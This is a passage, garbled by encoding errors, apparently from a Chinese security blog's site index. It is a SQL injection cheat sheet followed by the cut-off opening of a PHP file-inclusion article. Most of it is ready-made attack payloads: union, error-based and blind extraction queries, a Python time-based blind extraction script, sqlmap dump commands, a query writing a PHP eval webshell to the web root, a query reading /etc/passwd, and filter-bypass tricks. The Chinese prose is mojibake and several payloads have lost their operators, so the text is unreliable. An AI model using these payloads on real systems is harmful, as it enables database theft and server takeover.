å¦‚æœå‘ç°ä¸€å¼€å§‹é¡µé¢å…ˆæ˜¯æ­£å¸¸ç„¶åæ˜¯å¼‚å¸¸çš„è¯ï¼Œè¯´æ˜é¡µé¢å­˜åœ¨æ³¨å…¥ã€‚å½“ç„¶è¿™é‡Œæ˜¯æœ€åŸºæœ¬çš„åˆ¤æ–­æ–¹æ³•ï¼Œåˆ°åé¢ç›²æ³¨çš„æ—¶å€™æ˜¯ç”¨å»¶æ—¶å‡½æ•°æ¥è§‚å¯Ÿé¡µé¢çš„è¿”å›æ—¶é—´çš„ å…ˆæŒ‰æŠ¥é”™æ³•æ‰¾åˆ°å¯èƒ½çš„é—­åˆæ–¹å¼ï¼Œåœ¨åŠ æ³¨é‡Šçœ‹å“ªä¸ªé—­åˆæ–¹å¼å¯ä»¥æ­£å¸¸è®¿é—® 3.æŸ¥è¯¢å­—æ®µæ•°ç›® ?id=1 order by 3 # é»˜è®¤æŒ‰ç…§å‡åºå¯¹è®°å½•è¿›è¡Œæ’åºï¼Œå¯ç”¨descå…³é”®å­—æŒ‰ç…§é™åºå¯¹è®°å½•è¿›è¡Œæ’åº order byåé¢çš„åˆ—æ•°å¤§äºå®é™…çš„åˆ—æ•°å°±ä¼šæŠ¥é”™ è”åˆæŸ¥è¯¢æ³¨å…¥ æ³¨æ„ï¼šUNION æ“ä½œç¬¦ç”¨äºåˆå¹¶ä¸¤ä¸ªæˆ–å¤šä¸ª SELECT è¯­å¥çš„ç»“æœ åˆ¤æ–­å›æ˜¾ï¼ˆå‡è®¾3åˆ—ï¼‰ ?id=-1 union select 1,2,3 # è§¦å‘é”™è¯¯çš„æ–¹å¼ï¼š-1â€™ã€ 1â€™ and 1=2ã€ 1â€™ or 1=1 çˆ†ç ´æ•°æ®(å‡è®¾å›æ˜¾ä½ä¸º2) æ•°æ®åº“å ?id=-1 union select 1,database(),3 # æŸ¥è¡¨å ?id=-1 union select 1, group_concat(table_name) ,3 from information_schema.tables where table_schema=database() # æŸ¥åˆ—å ?id=-1 union select 1, group_concat(column_name) ,3 from information_schema.columns where table_name=è¡¨å # å…·ä½“æ•°æ® ?id=-1 union select 1,group_concat(åˆ—å1,åˆ—å2) ,3 from è¡¨å # ä¸€äº›é»˜è®¤æ•°æ®åº“æœ‰å…³çŸ¥è¯† table_schemaï¼šæ•°æ®åº“å table_nameï¼šè¡¨å column_nameï¼šåˆ—å information_schema.tablesï¼šæ•°æ®åº“çš„è¡¨å information_schema.columnsï¼šæ•°æ®åº“çš„åˆ—å limit m,n mï¼šæ˜¯æŒ‡è®°å½•å¼€å§‹çš„ä½ç½®ï¼Œä»0å¼€å§‹ï¼Œè¡¨ç¤ºç¬¬ä¸€æ¡è®°å½• nï¼šæ˜¯æŒ‡å–næ¡è®°å½• limit 0,1 è¡¨ç¤ºä»ç¬¬ä¸€æ¡è®°å½•å¼€å§‹ï¼Œè¡¨ç¤ºå–ç¬¬ä¸€æ¡è®°å½• ä¸€äº›å¸¸è§å‡½æ•° 1.concatï¼šå°†å¤šä¸ªå­—ç¬¦ä¸²è¿æˆä¸€ä¸ªå­—ç¬¦ä¸² concat(str1ï¼Œstr2) è¿”å›ç»“æœä¸ºè¿æ¥å‚æ•°äº§ç”Ÿçš„å­—ç¬¦ä¸²ï¼Œå¦‚æœæœ‰ä»»ä½•ä¸€ä¸ªå‚æ•°ä¸ºnullï¼Œåˆ™è¿”å›å€¼ä¸ºnull 2.concat_wsï¼šconcatç‰¹æ®Šå½¢å¼ï¼Œå¤šäº†ä¸ªåˆ†éš”ç¬¦ concat_ws(separator,str1,str2,â€¦) åœ¨å¤„ç† NULLå€¼æ—¶ä¸ä¼šè¿”å› NULL 3.group_concat()ï¼šå°†å¤šè¡Œç»“æœè¿æ¥ä¸ºä¸€è¡Œå­—ç¬¦ä¸² 4.substrï¼šç”¨æ¥æˆªå–æ•°æ®åº“æŸä¸ªå­—æ®µä¸­çš„ä¸€éƒ¨åˆ† substr(stringï¼Œstartï¼Œlength) ä¾‹å¦‚ï¼Œè·å– column_name åˆ—çš„å‰ 10 ä¸ªå­—ç¬¦ select substr(åˆ—å, 1, 10) from è¡¨å 5.asciiï¼šè¿”å›å­—ç¬¦ä¸²stræœ€å·¦è¾¹çš„æ•°å€¼ ascii(str) æŠ¥é”™æ³¨å…¥ é€šè¿‡ç‰¹æ®Šå‡½æ•°é”™è¯¯ä½¿ç”¨å¹¶ä½¿å…¶è¾“å‡ºé”™è¯¯ç»“æœæ¥è·å–ä¿¡æ¯ æŠ¥é”™æ³¨å…¥ä¸ºå•¥ä¼šå›æ˜¾ï¼Ÿ å› ä¸ºæœ‰å­—ç¬¦ï¼ˆå¦‚~ï¼‰ä¸æ»¡è¶³xmlçš„æ ¼å¼å¯¼è‡´æŠ¥é”™ åœ¨é‡æœ‰æŠ¥é”™å›æ˜¾ä½†æ²¡æ•°æ®å›æ˜¾æ—¶å¯åˆ©ç”¨ æŠ¥é”™æ³¨å…¥å‡½æ•° floor():å‘ä¸‹å–æ•´ ?id=1 and (select 1 from (select count(*),concat((select database() from information_schema.tables limit 0,1),floor(rand()*2))x from information_schema.tables group by x)a) # //è·å–æ•°æ®åº“å extractvalue():å¯¹XMLæ–‡æ¡£è¿›è¡ŒæŸ¥è¯¢çš„å‡½æ•°ï¼Œå½“å‚æ•°æ ¼å¼ä¸æ­£ç¡®è€Œäº§ç”Ÿçš„é”™è¯¯ï¼Œä¼šè¿”å›å‚æ•°çš„ä¿¡æ¯ è¯­æ³•ï¼šextractvalue(XML_document,XPath_string); payloadï¼š and (extractvalue(1,concat(0x7e,select database()),0x7e)) æ³¨ï¼šå…¶ä¸€æ¬¡åªèƒ½æŸ¥è¯¢32ä½é•¿åº¦ updatexml():æ›´æ–°XMLæ–‡æ¡£çš„å‡½æ•°ï¼ŒåŸç†å’Œextractvalueä¸€æ · è¯­æ³•ï¼šupdatexml(XML_document,XPath_string,new_value); payloadï¼š updatexml(1,concat(0x7e,(select database()),0x7e),1) exp():ä»¥eä¸ºåº•çš„æŒ‡æ•°å‡½æ•° 1.çˆ†æ•°æ®åº“å and updatexml(1,concat(0x7e,mid((select group_concat(schema_name) from information_schema.schemata),1,31)),1) 2,çˆ†è¡¨å and updatexml(1, concat(0x7e, mid((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,31)),1) # 3.çˆ†åˆ—å and updatexml(1, concat(0x7e, mid((select group_concat(column_name) from information_schema.columns where table_name=è¡¨å),1,31)),1) # 4.çˆ†å€¼ and updatexml(1, concat(0x7e, mid((select group_concat(åˆ—1,0x3a,åˆ—2) from è¡¨å),1,31)),1) # ç›²æ³¨ çœ‹ä¸åˆ°è¿”å›æ•°æ®æƒ…å†µä¸‹é€šè¿‡å·®å¼‚ï¼ˆåŒ…æ‹¬è¿è¡Œæ—¶é—´çš„å·®å¼‚å’Œé¡µé¢è¿”å›ç»“æœçš„å·®å¼‚ï¼‰æ¥åˆ¤æ–­ å¸ƒå°”ç›²æ³¨ åœ¨é¡µé¢ä¸­ï¼Œæ­£ç¡®æ‰§è¡Œå’Œé”™è¯¯æ‰§è¡ŒSQLè¯­å¥è¿”å›é¡µé¢ä¸ä¸€æ ·ï¼ŒåŸºäºä¸¤ç§é¡µé¢ï¼Œæ¥åˆ¤æ–­SQLè¯­å¥æ­£ç¡®ä¸å¦ï¼Œè¾¾åˆ°è·å–æ•°æ®çš„ç›®çš„ å‡ ä¸ªç›²æ³¨å‡½æ•° length()ï¼šè¿”å›å­—ç¬¦ä¸²çš„é•¿åº¦ limit(a,b)ï¼šä»ç¬¬ï¼ˆa+1ï¼‰è¡Œå¼€å§‹ï¼Œå–æ•°é‡ä¸ºbè¡Œçš„æ•°æ® substr()ï¼šæˆªå–å­—ç¬¦ä¸² ascii()ï¼šè¿”å›å­—ç¬¦çš„asciiç ï¼Œå…¶åŒåå‡½æ•°ordç”¨äºè¿‡æ»¤asciiçš„è¿‡æ»¤ left(a,b)ï¼šä»å·¦ä¾§æˆªå–açš„å‰bä½ åˆ¤æ–­æ•°æ®åº“çš„é•¿åº¦ï¼š id=1 and (length(database())3) åˆ¤æ–­æ•°æ®åº“çš„å…·ä½“åç§°ï¼š id=1 and (ascii(substr(database(),x,1))110) åˆ¤æ–­è¡¨çš„ä¸ªæ•°ï¼š id=1 and length((select table_name from information_schema.tables where table_schema=database() limit x,1))0//ä¸Šä¾‹è‹¥x=0åˆ™ç”¨æ¥åˆ¤æ–­æ˜¯å¦å­˜åœ¨è¡¨ åˆ¤æ–­è¡¨çš„é•¿åº¦ï¼š id=1 and length((select table_name from information_schema.tables where table_schema=database() limit x,1))=4//ä¸Šä¾‹ç”¨æ¥åˆ¤æ–­ç¬¬ï¼ˆx+1ï¼‰ä¸ªè¡¨é•¿åº¦æ˜¯å¦ä¸º4 åˆ¤æ–­è¡¨åï¼š id=1 and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit x,1),y,1))=110//ä¸Šä¾‹ç”¨æ¥åˆ¤æ–­ç¬¬ï¼ˆx+1ï¼‰ä¸ªè¡¨çš„ç¬¬yä¸ªå­—ç¬¦asciiç æ˜¯å¦ä¸º110 åˆ¤æ–­åˆ—çš„ä¸ªæ•°ï¼š id=1 and (select count(column_name) from information_schema.columns where table_name=flag)=1//ä¸Šä¾‹ç”¨æ¥åˆ¤æ–­flagè¡¨çš„åˆ—æ•° åˆ¤æ–­åˆ—çš„é•¿åº¦ï¼š id=1 and ascii(substr((select column_name from information_schema.columns where table_name = flag), 4,1)) åˆ¤æ–­åˆ—åï¼š id=1 and ascii(substr((select column_name from information_schema.columns where table_name = flag), 1,1))=102 æŸ¥å€¼ï¼ˆè™šæ‹Ÿæœºä¸­ï¼‰ï¼š sqlmap -r 1.txt --technique B -D web -T flag -C value --dump --level 3 --risk 3 æ—¶é—´ç›²æ³¨ é€šè¿‡è§‚å¯Ÿé¡µé¢ï¼Œæ—¢æ²¡æœ‰å›æ˜¾æ•°æ®åº“å†…å®¹ï¼Œåˆæ²¡æœ‰æŠ¥é”™ä¿¡æ¯ä¹Ÿæ²¡æœ‰å¸ƒå°”ç±»å‹çŠ¶æ€ sleep()ï¼šå°†ç¨‹åºæŒ‚èµ·nç§’åå“åº” if(expr1,expr2,expr3)ï¼šå¦‚æœexpr1æ˜¯trueï¼Œåˆ™if()çš„è¿”å›å€¼ä¸ºexpr2ï¼Œå¦åˆ™è¿”å›å€¼åˆ™ä¸ºexpr3 åˆ¤æ–­æ³¨å…¥ç‚¹ï¼š â€˜ and sleep(5) # åˆ¤æ–­æ•°æ®åº“çš„é•¿åº¦ï¼š id=1 and if(length(database())=4,sleep(3),1) åˆ¤æ–­æ•°æ®åº“çš„å…·ä½“åç§°ï¼š id=1 and if(ascii(substr(database(),x,1))110,sleep(3),1) åˆ¤æ–­è¡¨çš„ä¸ªæ•°ï¼š id=1 and if((select count(table_name) from information_schema.tables where table_schema=database())=x,sleep(3),1) //è¿™é‡Œçš„xä»1å¼€å§‹åˆ¤æ–­æ•°æ®åº“ä¸­å­˜åœ¨çš„è¡¨çš„æ•°é‡ åˆ¤æ–­è¡¨åï¼š id=1 and if(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit x,1),y,1))=110,sleep(3),1) åˆ¤æ–­åˆ—çš„ä¸ªæ•°ï¼š id=1 and if((select count(column_name) from information_schema.columns where table_name=flag)=x,sleep(3),1) //è¿™é‡Œçš„xä»1å¼€å§‹åˆ¤æ–­flagè¡¨ä¸­å­˜åœ¨çš„å­—æ®µæ•°é‡ åˆ¤æ–­åˆ—åï¼š id=1 and if(ascii(substr((select column_name from information_schema.columns where table_name=flag),x,1))=xxx,sleep(3),1)//è¿™é‡Œçš„xæ˜¯ä»1å¼€å§‹åˆ¤æ–­å­—æ®µçš„ä½ç½®ï¼Œxxxå¯¹åº”äº†å…·ä½“çš„asciiå€¼ æŸ¥å€¼ï¼ˆè™šæ‹Ÿæœºä¸­ï¼‰ï¼š sqlmap -r 1.txt --technique T -D web -T flag -C value --dump --level 3 --risk 3 æ—¶é—´ç›²æ³¨è„šæœ¬ï¼ˆpostå‹ï¼‰ import requestsimport stringimport time#é…ç½®ç›®æ ‡ URL å’ŒåŸºç¡€ä¿¡æ¯url = ........username_template = or if((select substr(value,index,1) from flag)=char,sleep(3),0)##å¡«å†™payloadpassword = 0#ç”¨äºæµ‹è¯•çš„å­—ç¬¦é›†ï¼ˆå¯ä»¥æ ¹æ®å®é™…æƒ…å†µæ‰©å±•ï¼‰charset = string.ascii_letters + string.digits + _-def time_blind_injection(): extracted_value = index = 1 # ä»ç¬¬1ä¸ªå­—ç¬¦å¼€å§‹ while True: found = False for char in charset: payload = username_template.format(index=index, char=char) start_time = time.time() # å‘é€ POST è¯·æ±‚ response = requests.post(url, data=username: payload, password: password) elapsed_time = time.time() - start_time # åˆ¤æ–­å“åº”æ—¶é—´æ˜¯å¦è¶…è¿‡3ç§’ if elapsed_time 3: extracted_value += char print(f[+] Found character at position index: char) found = True break if not found: # å¦‚æœåœ¨å½“å‰ç´¢å¼•æ²¡æœ‰æ‰¾åˆ°å­—ç¬¦ï¼Œè¯´æ˜åˆ°è¾¾å­—ç¬¦ä¸²æœ«å°¾ print([+] Extraction complete!) break index += 1 return extracted_value if __name__ == __main__: print([*] Starting time-based blind SQL injection...) result = time_blind_injection() print(f[+] Extracted value: result) ç›²æ³¨æ›´æå€¡ç”¨sqlmapè‡ªåŠ¨åŒ– å †å æŸ¥è¯¢æ³¨å…¥ å †å æŸ¥è¯¢å¯ä»¥æ‰§è¡Œå¤šæ¡è¯­å¥ï¼Œå¤šæ¡è¯­å¥é—´ä»¥åˆ†å·éš”å¼€ ä¾‹å¦‚phpä¸­çš„**mysql_multi_query()ï¼Œpymysqlä¸­çš„cursor.execute()**æ”¯æŒå¤šæ¡sqlè¯­å¥åŒæ—¶æ‰§è¡Œ æŸ¥æ•°æ®åº“ï¼š 0;show databases;# æŸ¥è¡¨ï¼š 0;show tables;# æŸ¥åˆ—ï¼š 0;show columns from è¡¨å;#æˆ–0;desc åˆ—å;# æŸ¥æ•°æ®(ä½¿ç”¨é¢„å¤„ç†è¯­å¥)ï¼š //selectè¢«ç»•è¿‡æ—¶ï¼Œä½¿ç”¨concatå‡½æ•°å°†selectè¿›è¡Œè¿æ¥è¿‡æ»¤0;sEt@a=concat(sel,ect åˆ—å from è¡¨å);PRepare hello from @a;execute hello;# æ›´æ–°æ³¨å…¥ æ›´æ–°ç±»çš„æ“ä½œçš„è¿”å›ç»“æœéƒ½æ˜¯å¸ƒå°”å‹ï¼Œæ— æ³•è¿”å›æ•°æ® insert into user(username,password,role) values(admin or updatexml(1, concat(0x7e, database(), 0x7e), 1) or , passwd, editor) update user set password = ikun666 where id = 9 or extractvalue(1, concat(0x7e, version(), 0x7e)); äºŒæ¬¡æ³¨å…¥ äºŒæ¬¡æ³¨å…¥å°±æ˜¯ç”±äºå°†æ•°æ®å­˜å‚¨è¿›æ•°æ®åº“ä¸­æ—¶æœªåšå¥½è¿‡æ»¤ï¼Œå…ˆæäº¤æ„é€ å¥½çš„ç‰¹æ®Šå­—ç¬¦è¯·æ±‚å­˜å‚¨è¿›æ•°æ®åº“ï¼Œç„¶åæäº¤ç¬¬äºŒæ¬¡è¯·æ±‚æ—¶ä¸ç¬¬ä¸€æ¬¡æäº¤è¿›æ•°æ®åº“ä¸­çš„å­—ç¬¦å‘ç”Ÿäº†ä½œç”¨ï¼Œå½¢æˆäº†ä¸€æ¡æ–°çš„sqlè¯­å¥å¯¼è‡´è¢«æ‰§è¡Œ åˆ©ç”¨æ¡ä»¶ï¼šçŸ¥é“æ•°æ®åº“ä¸­çš„åˆ—åä¸”ä½¿ç”¨äº†magic_quote_gpcç­‰å¯¹å¼•å·è¿‡æ»¤ ä¾‹å¦‚å­˜åœ¨æ³¨å†Œå’Œç™»å½•ä¸¤ä¸ªç‚¹å‡»æ¡†ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™æ·»åŠ ä¸€äº›ç‰¹æ®Šå­—ç¬¦ï¼Œåˆ›å»ºæˆåŠŸåï¼Œç™»å½•è¿›è¡Œä¿®æ”¹å¯†ç ï¼Œå‘ç°æŠ¥é”™è¯­å¥ï¼Œè¿™é‡Œå°±å¯ä»¥åˆ¤å®šæ˜¯å­˜åœ¨äºŒæ¬¡æ³¨å…¥çš„ï¼Œåœ¨æ³¨å†Œçš„æ—¶å€™å†™å…¥ï¼Œç„¶åå†ä¿®æ”¹å¯†ç çš„åœ°æ–¹ä¿®æ”¹å¯†ç åè§¦å‘ï¼Œè¿™æ ·å°±å¯¼è‡´é”™è¯¯çš„è¾“å‡ºï¼Œè¿™é‡Œæœ‰é”™è¯¯çš„å›æ˜¾å°±å¯ä»¥ä½¿ç”¨æŠ¥é”™æ³¨å…¥æ¥è¿›è¡Œæ³¨å…¥ HTTPå¤´æ³¨å…¥ HTTPå¤´éƒ¨æ³¨å…¥æ˜¯é€šè¿‡HTTPåè®®å¤´éƒ¨å­—æ®µå€¼è¿›è¡Œæ³¨å…¥ï¼Œå¸¸å­˜åœ¨äºrefererã€X-Forwarded-Forã€Cookieã€X-Real-IPã€Accept-Languageã€Authorizationï¼ŒUser-Agent User-Agentæ³¨å…¥ åˆ¤æ–­æ³¨å…¥ç‚¹ï¼šuser-agentå€¼åé¢åŠ ä¸Š'ï¼Œå¼•å‘æŠ¥é”™ï¼Œç¡®å®šå­˜åœ¨sqlæ³¨å…¥ é‡‡ç”¨æŠ¥é”™æ³¨å…¥å‡½æ•°è·å–å½“å‰æ•°æ®åº“å and updatexml(1,concat(0x7e,(database()),0x7e),0) and cookieæ³¨å…¥ é‡‡ç”¨è”åˆæ³¨å…¥æˆ–æŠ¥é”™æ³¨å…¥ -1 union select 1,group_concat(table_name) from information_schema.tables where table_schema=æ•°æ®åº“å å‰©ä¸‹çš„å°±æ˜¯éœ€è¦æŸ¥è¯¢è¡¨ä¸­çš„å­—æ®µå’Œå­—æ®µçš„è¯¦ç»†ä¿¡æ¯ï¼Œå’Œæ™®é€šSQLæ³¨å…¥åŒç† Refereræ³¨å…¥ XFFæ³¨å…¥ å®½å­—èŠ‚æ³¨å…¥ åˆ©ç”¨æ¡ä»¶ï¼šæ•°æ®åº“ä½¿ç”¨äº†GBKç¼–ç ï¼Œä½¿ç”¨magic_quotes_gpcå¯¹å¼•å·è¿‡æ»¤ magic_quotes_gpcçš„ä½œç”¨ï¼šå½“PHPçš„ä¼ å‚ä¸­æœ‰ç‰¹æ®Šå­—ç¬¦å°±ä¼šåœ¨å‰é¢åŠ è½¬ä¹‰å­—ç¬¦â€™',æ¥åšä¸€å®šçš„è¿‡æ»¤ \\çš„ç¼–ç æ˜¯%5c,è¾“å…¥%df'ï¼Œç»è¿‡è¿‡æ»¤å¤„ç†åä¼šå˜æˆ%df\\'ä¹Ÿå°±æ˜¯%df%5cï¼ŒGBKç¼–ç ä¸­æ–‡å­—ç¬¦â€™é‹â€™ åŸç†ï¼šæ±‰å­—urlç¼–ç 2ä½ï¼Œåˆ©ç”¨æ±‰å­—çš„ä¸€åŠç¼–ç ä¸/ç»„åˆè¿‡æ»¤ æ¥ç€ä¸æ­£å¸¸æ³¨å…¥æ­¥éª¤ä¸€æ · ?id=-1%df%27 union select 1,2,database()%23 ä½†åç»­æŸ¥è¡¨ä¼šå‡ºç°å•å¼•å·ï¼ˆä½†å…¶ä¼šè¢«è½¬ä¹‰ï¼‰ï¼Œç”¨åµŒå¥—æŸ¥è¯¢ ?id=20%df%27 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=(select database())%23 ?id=20%df%27 union select 1,2,column_name from information_schema.columns where table_schema = (select database()) and table_name = (select table_name from information_schema.tables where table_schema = (select database())limit 0, 1)limit 0,1 %23 äºŒæ¬¡ç¼–ç æ³¨å…¥ åˆ©ç”¨æ¡ä»¶ï¼šç›®æ ‡ç«™ç‚¹ä½¿ç”¨äº†urldecode()è§£ç  %çš„urlç¼–ç ä¸ºï¼š%25 'çš„urlç¼–ç ä¸ºï¼š%27 %25%27ï¼ŒURLè§£ç åæ˜¯%27 ä¹Ÿå°±æ˜¯' MySQLå†™å…¥webshell æ‹¿ä¸‹æ•°æ®åº“åå¦‚æœæœ‰æƒé™çš„è¯å¯ä»¥è¯»å–æ–‡ä»¶æˆ–è€…å†™å…¥webshell åˆ©ç”¨å‰æ 1.secure_file_privä¸ºç©º show global variables like %secure% secure_file_priv = ä»»æ„è·¯å¾„è¯»å†™ secure_file_priv = path åªèƒ½åœ¨è¯¥æŒ‡å®šè·¯å¾„ä¸‹è¯»å†™ secure_file_priv = null ä¸èƒ½è¯»å†™ 2.å…·æœ‰å†™å…¥æ–‡ä»¶æƒé™ 3.çŸ¥é“ç½‘ç«™ç»å¯¹è·¯å¾„ å†™å…¥æ–‡ä»¶ ä½¿ç”¨into outfile()å°†ä¸€å¥è¯å†™å…¥ç½‘ç«™ç›®å½• select ?php eval($_POST[cmd];?) into outfile \\/var\\/www\\/html\\/shell.php; è¯»å–æ–‡ä»¶ ä½¿ç”¨load_file()å‡½æ•°è¯»å–æ–‡ä»¶ ?id=-1 union select 1,2,load_file(//etc//passwd) ç»•è¿‡æ–¹å¼ æ³¨é‡Šç¬¦ #, --+, -- -, %23, %00, /**/ #ä¸€èˆ¬åœ¨postä¼ å‚ï¼Œ%23ä¸€èˆ¬åœ¨getä¼ å‚ andï¼Œor è¿‡æ»¤ # å¯ä»¥ä½¿ç”¨å’Œ||ä»£æ›¿?id=1 1=1 --+ # ç›²æ³¨ï¼Œå¼‚æˆ–è¿ç®—ç›¸åŒä¸º0ï¼Œä¸åŒä¸º1ï¼›æ ¹æ®è¿”å›å€¼0ï¼Œ1åˆ¤æ–­?id=1 union select (substr(database(),1,1)=s) ^ 0 -- å…³é”®è¯ç»•è¿‡ å¤§å°å†™ç»•è¿‡ id=-1 UnIoN SeLeCT xxx åŒå†™ç»•è¿‡ id=-1UNIunionONSeLselectECT1,2,3â€“- ç¼–ç ç»•è¿‡ å¯ä»¥ä½¿ç”¨URLï¼Œhexï¼ŒASCIIç­‰ç¼–ç ç»•è¿‡ ä¾‹å¦‚â€™or 1=1å¯ç”¨27%20%4F%52%201%3D%31%20%2D%2D æ³¨é‡Šç»•è¿‡ å†…è”æ³¨é‡Š/**/å°†å…³é”®è¯åˆ†éš”å¼€ UN/**/ION SE/**/LECT ç©ºæ ¼ç»•è¿‡ å†…è”æ³¨é‡Šä»£æ›¿ç©ºæ ¼ id=1/**/and/**/1=1 æ‹¬å·åµŒå¥— select(group_concat(table_name))from(information_schema.taboles)where(tabel_schema=database()); åˆ¶è¡¨ç¬¦ã€æ¢è¡Œã€ä¸å¯è§ç©ºæ ¼ %09(åˆ¶è¡¨ç¬¦), %0a(æ¢è¡Œ), %0b(å‚ç›´åˆ¶è¡¨ç¬¦), %0d(å›è½¦), %a0(ä¸é—´æ–­ç©ºæ ¼)%0c(æ¢é¡µç¬¦),%20(ç©ºæ ¼) åå¼•å· union(select`table_name`,`table_type`from`information_schema`.`tables`); =è¢«è¿‡æ»¤ å¯ä»¥ç”¨like(å…¶å­å¥ä¸­ç”¨%æ¥è¡¨ç¤ºä»»æ„å­—ç¬¦)æˆ–rlikeï¼Œä¹Ÿå¯ä»¥ç”¨regexp(ä¸åŒºåˆ†å¤§å°å†™ï¼Œè‹¥éœ€è¦å¤§å°å†™æ•æ„Ÿï¼ŒåŠ binary)æ¥ç»•è¿‡ æ¯”å¦‚=â€˜adminâ€™ å°±å¯ä»¥like â€˜adminâ€™ é€—å·è¿‡æ»¤ é€—å·è¢«è¿‡æ»¤æ—¶å¯ä»¥ä½¿ç”¨from...for... select substr(select database() from 1 for 1); limitä¸­çš„é€—å·å¯ä»¥æ›¿æ¢æˆoffset select * from users limit 1 offset 2; limit 1,2 æ˜¯ä»ç¬¬ä¸€è¡Œå¾€åå–2è¡Œï¼ˆåŒ…æ‹¬ç¬¬ä¸€è¡Œå’Œç¬¬äºŒè¡Œ) limit 1 offset 2æ˜¯ä»ç¬¬ä¸€è¡Œå¼€å§‹åªå–ç¬¬äºŒè¡Œ Falseæ³¨å…¥ select * from users where username = 0; # æŸ¥è¯¢è¡¨ä¸­æ‰€æœ‰æ•°æ® å…¶å®æ˜¯åˆ©ç”¨äº†mysqlçš„éšå¼ç±»å‹è½¬æ¢ï¼Œå½“å­—ç¬¦ä¸²ä¸æ•°å­—æ¯”è¾ƒæ—¶ï¼Œä¼šå°†å­—ç¬¦ä¸²è½¬æ¢ä¸ºæµ®ç‚¹æ•°ï¼Œè½¬æ¢å¤±è´¥å¹¶è¿”å›0ï¼Œ0 = 0è¿”å›Trueï¼Œå°±ä¼šè¿”å›è¡¨ä¸­æ‰€æœ‰æ•°æ® ç»•è¿‡å¼•å·æ„é€ 0çš„æ–¹æ³• select * from users where username = +;select * from users where username = -;select * from users where username = *;select * from users where username = %1#;select * from users where username = /6#; ç­‰ä»·å‡½æ•° if()ä¸ caseâ€¦whenâ€¦thenâ€¦elseâ€¦end 0 or if((ascii(substr((select database()),1,1))97),1,0)#=0 or case when ascii(substr((select database()),1,1))97 then 1 else 0 end# sleep()ä¸benchmark() benchmark()å‡½æ•°ç”¨æ¥æµ‹è¯•æ‰§è¡Œé€Ÿåº¦ï¼Œç¬¬ä¸€ä¸ªå‚æ•°ä»£è¡¨æ‰§è¡Œçš„æ¬¡æ•°ï¼Œç¬¬äºŒä¸ªå‚æ•°ä»£è¡¨è¦æ‰§è¡Œçš„è¡¨è¾¾å¼æˆ–å‡½æ•°ï¼Œæ ¹æ®æ‰§è¡Œçš„æ—¶é—´æ¥åˆ¤æ–­ ?id=1 AND BENCHMARK(5000000, MD5(test)) concat_ws()ä¸group_concat() select group_concat(database());=select concat_ws(1,database()); substr()ä¸substring()/ipad()/rpad()/left()/mid() å‚è€ƒï¼š SQLæ³¨å…¥åˆ©ç”¨åŠç»•è¿‡","tags":["æ¼æ´","SQL"],"categories":["æ¼æ´"]},{"title":"PHPæ–‡ä»¶åŒ…å«æ¼æ´","path":"/2025/07/09/PHPæ–‡ä»¶åŒ…å«æ¼æ´/","content":"PHPæ–‡ä»¶åŒ…å«æ¼æ´ åŸºç¡€çŸ¥è¯† æ¦‚è¿° å’ŒSQLæ³¨å…¥ç­‰æ”»å‡»æ–¹å¼ä¸€æ ·ï¼Œæ–‡ä»¶åŒ…å«æ¼æ´ä¹Ÿæ˜¯ä¸€ç§æ³¨å…¥å‹æ¼æ´ï¼Œå…¶æœ¬è´¨å°±æ˜¯è¾“å…¥ä¸€æ®µç”¨æˆ·èƒ½å¤Ÿæ§åˆ¶çš„è„šæœ¬æˆ–è€…ä»£ç ï¼Œå¹¶è®©æœåŠ¡ç«¯æ‰§è¡Œ â€œåŒ…å«â€ï¼šä»¥PHPä¸ºä¾‹ï¼Œæˆ‘ä»¬å¸¸å¸¸æŠŠå¯é‡å¤ä½¿ç”¨çš„å‡½æ•°å†™å…¥åˆ°å•ä¸ªæ–‡ä»¶ä¸­ï¼Œåœ¨ä½¿ç”¨è¯¥å‡½æ•°æ—¶ï¼Œç›´æ¥è°ƒç”¨æ­¤æ–‡ä»¶ï¼Œè€Œæ— éœ€å†æ¬¡ç¼–å†™å‡½æ•°ï¼Œè¿™ä¸€è¿‡ç¨‹å«åšåŒ…å« æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¿®æ”¹æ–‡ä»¶çš„ä½ç½®æ¥è®©åå°æ‰§è¡Œä»»æ„æ–‡ä»¶ï¼Œä»è€Œå¯¼è‡´æ–‡ä»¶åŒ…å«æ¼æ´ ç›¸å…³å‡½æ•° includeï¼Œ require requireæŠ¥é”™ä¼šç»ˆæ­¢ç¨‹åºï¼Œä½†æ˜¯includeä¼šç»§ç»­æ‰§è¡Œä¸‹é¢ä»£ç ã€‚ include_once ï¼Œrequire_once åŒ…å«è¿‡çš„å°±ä¸ä¼šç»§ç»­åŒ…å« æ¼æ´ç±»å‹ LFI(Local File Inclusion) æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒæŒ‡çš„æ˜¯èƒ½æ‰“å¼€å¹¶åŒ…å«æœ¬åœ°æ–‡ä»¶çš„æ¼æ´ã€‚å¤§éƒ¨åˆ†æƒ…å†µä¸‹é‡åˆ°çš„æ–‡ä»¶åŒ…å«æ¼æ´éƒ½æ˜¯LFI RFI(Remote File Inclusion) è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼ŒæŒ‡èƒ½å¤ŸåŒ…å«è¿œç¨‹æœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶æ‰§è¡Œã€‚ç”±äºè¿œç¨‹æœåŠ¡å™¨çš„æ–‡ä»¶æ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œå› æ­¤æ¼æ´ä¸€æ—¦å­˜åœ¨å±å®³æ€§ä¼šå¾ˆå¤§ RFIå¯¹php.inié‡Œçš„é…ç½®æœ‰äº›è¦æ±‚ï¼š allow_url_fopen = On allow_url_include = On allow_url_fopen å…è®¸ PHP è¯»å–è¿œç¨‹æ–‡ä»¶ allow_url_include åˆ™å…è®¸ PHP åœ¨ä»£ç ä¸­åŒ…å«è¿œç¨‹æ–‡ä»¶ æ³¨ï¼šåœ¨php.iniä¸­ï¼Œallow_url_fopené»˜è®¤ä¸€ç›´æ˜¯Onï¼Œè€Œallow_url_includeä»php5.2ä¹‹åå°±é»˜è®¤ä¸ºOff æµ‹è¯• å¦‚æœç›®æ 